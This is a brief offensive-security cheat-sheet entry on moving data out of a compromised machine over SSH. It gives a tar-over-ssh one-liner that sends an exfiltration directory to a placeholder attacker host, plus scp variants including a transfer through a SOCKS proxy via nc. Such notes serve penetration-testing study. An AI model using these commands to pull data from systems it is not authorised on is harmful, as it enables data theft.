# Data Exfiltration Over SSH

Either with `SCP` or some ssh client both should be encrypted. If you do not have access to  `SCP`:
```bash
# SSH onto the target machine
tar cf - $exfil_dir/ | ssh $attacker@$listening_domain.com "cd /tmp/; tar xpf -"
```

If you do:
```bash
# -P to specify port
scp <file> <user>@<host>:<dest>

# To copy a file from a remote server to your local machine:
scp <user>@<host>:<src> <dest>

# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):
scp -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <file> <user>@<host>:<dest>

# To scp between two remote servers from the third machine:
scp -3 <user>@<host1>:<src> <user>@<host2>:<dest>
```